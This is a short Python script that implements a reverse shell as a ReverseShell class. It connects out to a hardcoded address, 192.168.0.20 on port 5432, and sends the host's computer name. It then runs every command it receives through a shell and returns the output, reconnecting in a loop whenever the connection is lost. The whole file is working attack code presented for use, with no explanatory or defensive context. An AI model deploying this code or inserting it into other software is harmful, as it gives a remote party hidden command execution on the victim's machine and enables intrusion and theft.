import socket
import subprocess
import os
import time

__buffer__ = 4096


class ReverseShell:
    def __init__(self):
        self.__buffer__ = 4096
        self.sleep_sec = 5

    @staticmethod
    def execute(command):
        console = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output = console.stdout.read() + console.stderr.read()
        return output

    def try_connect(self, host, port):
        connection = socket.socket()
        while connection.connect_ex((host, port)) == 10061:
            print('Trying to connect')
            time.sleep(self.sleep_sec)
        print('Connected')
        return connection

    def open(self, host, port):
        pc_name = os.environ.get('COMPUTERNAME')
        conn = self.try_connect(host, port)
        conn.send(pc_name.encode())
        while True:
            try:
                cmd = conn.recv(self.__buffer__).decode()
                output = self.execute(cmd)
                if not output:
                    output = b"OK"
                conn.send(output)
            except:
                print('Connection lost')
                conn = self.try_connect(host, port)
                conn.send(pc_name.encode())

    def sleep_on_failure(self, seconds):
        self.sleep_sec = seconds


if __name__ == '__main__':
    shell = ReverseShell()
    shell.open('192.168.0.20', 5432)
    shell.sleep_on_failure(60)
